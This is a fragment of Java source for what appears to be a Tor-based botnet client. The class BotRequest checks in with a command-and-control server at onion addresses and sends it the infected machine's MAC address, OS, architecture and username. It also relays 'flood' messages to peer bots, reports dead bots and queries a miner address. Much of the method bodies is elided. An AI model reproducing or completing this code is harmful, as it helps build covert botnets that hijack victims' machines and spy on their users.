...
public class BotRequest {
	...
	@Async
	public Future<Pairs<OnionAddress, Integer>> esempioRichiesta(String uriMiner) {
		String result = "";
		Integer level = -1;
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				...
				return new AsyncResult<>(new Pairs<>(new OnionAddress(uriMiner), level));
			} catch (Exception e) {
	...
	public ArrayList<Pairs<String, String>> sendDeadNeighToCeC(String iPCeC, String myIdBot, List<OnionAddress> deadBotList) {
		ArrayList<Pairs<String, String>> result = new ArrayList<Pairs<String, String>>();
		Integer counter = 0;
		String encryptData = "";
		// richiesta del vicinato
		...
		for (OnionAddress obj : deadBotList) {
	...
	@Async
	public Boolean sendFloodToOtherBot(OnionAddress onionBot, String msg) {
		Boolean response = false;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + onionBot.getOnion() + PORT + "/bot/flood";
	...
	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, OnionAddress onionCeC,OnionAddress myOnion) {
		...
		while (counter < REQNUMBER) {
			try {
				String url = HTTPS + onionCeC + PORT + "/cec/welcome";
	...
	// da valutare se devono essere asincroni
	@Async
	public Future<Pairs<Long, Integer>> getChallengeFromBot(String idBot, OnionAddress ipBotDest) {
	 ...
	 * @return
	 */
	public String getResponseFromCeC(String idBot, OnionAddress ip, String Mac, String os, String vers, String arch, String usrName, OnionAddress dest, String hashMac, PublicKey pk, boolean elegible) {
		Integer counter = 0;
		String response = "";
		while (counter <= REQNUMBER) {
			try {
	...
	public Boolean getResponseFromBot(String idBot, OnionAddress dest, String hashMac, PublicKey pk) {
		Integer counter = 0;
		Boolean response = false;
		while (counter < REQNUMBER) {
			try {
